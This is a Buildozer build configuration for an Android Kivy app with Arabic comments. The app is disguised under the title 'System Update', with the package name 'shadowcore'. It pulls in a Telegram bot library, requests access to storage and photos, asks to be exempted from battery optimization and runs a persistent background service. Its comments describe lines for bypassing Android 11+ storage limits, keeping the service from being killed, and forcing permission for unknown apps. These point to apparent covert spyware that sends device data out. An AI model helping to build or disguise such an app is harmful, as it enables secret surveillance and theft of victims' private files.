[app]
# (str) اسم التطبيق
title = System Update

# (str) اسم الحزمة (مطابق لملف main.py)
package.name = shadowcore

# (str) نطاق الحزمة
package.domain = org.test

# (str) مكان الكود
source.dir = .

# (list) الملفات المطلوبة
source.include_exts = py,png,jpg,kv,atlas

# (str) الإصدار
version = 1.0

# (list) المكتبات (تأكد من وجود pyTelegramBotAPI)
requirements = python3,kivy,pyjnius,requests,pyTelegramBotAPI

# (str) الاتجاه
orientation = portrait

# (bool) الشاشة الكاملة
fullscreen = 0

# (list) الأذونات - تم إضافة إذن تجاهل البطارية وإذن المزامنة
android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS

# (int) API المستهدف (33 لأندرويد 13)
android.api = 33

# (int) أقل API
android.minapi = 21

# (list) المعماريات
android.archs = arm64-v8a, armeabi-v7a

# (list) الخدمات - الربط بملف service.py
services = Service:service.py

# --- [أسطر تجاوز الأخطاء والقيود] ---

# السماح بالوصول للملفات بنظام الأندرويد القديم (لتجاوز قيود أندرويد 11+)
android.manifest.attributes = android:requestLegacyExternalStorage="true"

# تحديد نوع الخدمة كـ "مزامنة بيانات" لضمان عدم إغلاقها في أندرويد 14
android.service_type = dataSync

# منع ظهور أخطاء الشاشة إذا تأخر تشغيل الخدمة
android.presplash_color = #000000

# إجبار النظام على السماح بالتطبيقات غير المعروفة من قبل الخدمة
android.manifest.application_extra_xml = 

[buildozer]
# مستوى التسجيل (debug)
log_level = 2

# التحذير عند التشغيل كجذر
warn_on_root = 1
